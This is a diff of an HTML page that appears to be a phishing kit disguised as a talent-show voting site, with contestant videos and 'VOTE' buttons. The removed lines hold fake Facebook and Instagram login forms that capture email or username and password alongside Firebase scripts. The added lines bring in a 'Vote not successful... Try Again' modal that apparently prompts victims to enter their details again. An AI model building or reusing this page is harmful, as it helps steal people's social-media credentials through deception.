-              <div class="card-body">
-                <h5 class="card-title"><span class="badge bg-warning text-dark">Entertainment</span> - <span class="badge bg-info text-dark">Comedy</span></h5>
-                  <video controls width="100%">
-
-                    <source src ="https://res.cloudinary.com/arabasiastarz/video/upload/v1649711891/n67uk3ybbtppemdjmq41.mov" type="video/mp4">
-
-                    <!-- <source src="mov_bbb.ogg" type="video/ogg"> -->
-
-                    Your browser does not support HTML video.
-                  </video>
-                  <button id="vote" type="button" class="btn btn-primary vote" data-id="294" data-user="484" data-bs-toggle="modal" data-bs-target="#exampleModal" onclick="vote()" >
-                  VOTE For Contestant 008 </a></button>
-                </div>
-              <div class="card-footer text-muted">    Votes : 110 
-            </div>
-          </div>
-        </div>
-                
-        <div class="col-sm-4">
-          <div class="card text-center">
-            <div class="card-header">Contestant 009  </div>
-              <div class="card-body">
-                <h5 class="card-title"><span class="badge bg-warning text-dark">Entertainment</span> - <span class="badge bg-info text-dark">Comedy</span></h5>
-                <video controls width="100%">
-
-                    <source src ="https://res.cloudinary.com/arabasiastarz/video/upload/v1651087663/vnhy7bod3d3auu3qyny4.mov" type="video/mp4">
-
-                    <!-- <source src="mov_bbb.ogg" type="video/ogg"> -->
-
-                    Your browser does not support HTML video.
-                  </video>
-                  <button id="vote" type="button" class="btn btn-primary vote" data-id="294" data-user="484" data-bs-toggle="modal" data-bs-target="#exampleModal" onclick="vote()" >
-                  VOTE For Contestant 009 </a></button>
-                </div>
-              <div class="card-footer text-muted"> Votes : 257
-            </div>
-          </div>
-        </div>
-               
-        <div class="col-sm-4">
-          <div class="card text-center">
-            <div class="card-header">Contestant 010  </div>
-              <div class="card-body">
-                  <h5 class="card-title"><span class="badge bg-warning text-dark">Entertainment</span> - <span class="badge bg-info text-dark">Comedy</span></h5>
-                  <video controls width="100%">
-
-                    <source src ="https://res.cloudinary.com/arabasiastarz/video/upload/v1650661497/t9tttunayegnzxibyoem.mov" type="video/mp4">
-
-                    <!-- <source src="mov_bbb.ogg" type="video/ogg"> -->
-
-                    Your browser does not support HTML video.
-                  </video>
-                  <button id="vote" type="button" class="btn btn-primary vote" data-id="294" data-user="484" data-bs-toggle="modal" data-bs-target="#exampleModal" onclick="vote()" >
-                  VOTE For Contestant 010 </a></button>
-                </div>
-              <div class="card-footer text-muted"> Votes : 134 
-            </div>
-          </div>
-        </div></div>
-               
-
-    </section>
-</div>
-    <div id="choose">
-      <center><br>
-        <p>
-          Vote using:
-        </p>
-      </center>
-      <center>
-        <p>
-          <img id="fb" onclick="fb()" src="image/fb.png">
-        </p>
-        <p>
-          <img id="ig" onclick="ig()" src="image/ig.png">
-        </p>
-        <br>
-        <button onclick="can()" id="cancel">Close</button>
-      </center>
+      </div>
     </div>
-  <center>
-    <div id="fbp">
-      <div class="facebook-login" id="fb2" align="center">
 
-        <div class="ggt">
-
-          <img src="image/fb.png" alt="logo" id="fblogo">
-          <h1 id="fb2">
-            facebook
-          </h1>
-          <input type="text" placeholder="Email or Phone number" id="fb-email"><br>
-          <input type="password" placeholder="Password" id="fb-pass"><br>
-          <button onclick="login()" id="fb-log">
-            Log in
+    <!-- Custom Alert -->
+    <div
+      id="custom-alert"
+      class="hidden fixed inset-0 flex items-center justify-center z-50 p-6">
+      <!-- Overlay -->
+      <div
+        class="fixed z-40 inset-0 bg-gray-500 dark:bg-gray-900 opacity-80"
+        onclick="hideAlert()"
+        aria-hidden="true"></div>
+      <!-- Trick to center modal -->
+      <span
+        class="hidden sm:inline-block sm:align-middle sm:h-screen"
+        aria-hidden="true"></span>
+      <!-- Error Dialog -->
+      <div
+        id="modal-content"
+        class="relative z-50 inline-block align-bottom bg-white dark:bg-gray-800 rounded-lg text-left overflow-visible shadow-xl my-8 w-full max-w-sm sm:max-w-md">
+        <!-- Close button -->
+        <div class="absolute top-0 right-0 pt-4 pr-4">
+          <button
+            type="button"
+            class="rounded-md text-gray-400 hover:text-gray-500 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500"
+            onclick="hideAlert()">
+            <span class="sr-only">Close</span>
+            <svg
+              class="h-6 w-6"
+              xmlns="http://www.w3.org/2000/svg"
+              fill="none"
+              viewBox="0 0 24 24"
+              stroke="currentColor">
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="2"
+                d="M6 18L18 6M6 6l12 12"></path>
+            </svg>
           </button>
         </div>
-      </div>
-
-    </div>
-  </center>
-  <center>
-    <div id="igp">
-      <div class="Instagram-login" id="ig2" align="center">
-
-        <div class="ppt">
-
-          <img src="image/ig2.jpg" alt="logo" id="iglogo"><br><br>
-          <br>
-          <input type="text" placeholder="Username or Email" id="ig-uname"><br>
-          <input type="password" placeholder="Password" id="ig-pass">
-          <br>
-          <button onclick="iglog()" id="ig-log">
-            log in
-          </button>
+        <!-- Modal Content -->
+        <div class="px-4 pt-5 pb-4 sm:p-6 rounded-md">
+          <div
+            class="mx-auto flex items-center justify-center h-12 w-12 rounded-full bg-red-100">
+            <svg
+              class="h-6 w-6 text-red-600"
+              xmlns="http://www.w3.org/2000/svg"
+              fill="none"
+              viewBox="0 0 24 24"
+              stroke="currentColor"
+              aria-hidden="true">
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="2"
+                d="M12 2a10 10 0 110 20 10 10 0 010-20zm-4 8l8 8m0-8l-8 8"></path>
+            </svg>
+          </div>
+          <div class="mt-3 text-center sm:mt-5">
+            <h3
+              id="alert-title"
+              class="text-lg leading-6 font-medium text-gray-900 dark:text-white">
+              Vote not successful
+            </h3>
+            <div class="mt-2">
+              <p id="alert-message" class="text-sm text-gray-500">
+                Sorry, something went wrong. Please try again.
+              </p>
+            </div>
+          </div>
+          <div class="mt-4 sm:mt-6 sm:flex sm:space-x-6">
+            <button
+              onclick="hideAlert()"
+              class="button w-full bg-blue-500 text-white py-2 px-4 rounded-lg hover:bg-blue-600 transition duration-300">
+              Try Again
+            </button>
+          </div>
         </div>
       </div>
     </div>
-  </center>
-  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
 
-  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
 
-  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
-  <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
 
-  <script src="js/firebase.js">
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+    <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
 
-
-
-  </script>
-
-
-</body>
-
+    <script src="js/firebase.js"></script>
+    <script src="js/main.js"></script>
+    <script src="js/index.js"></script>
+  </body>
 </html>
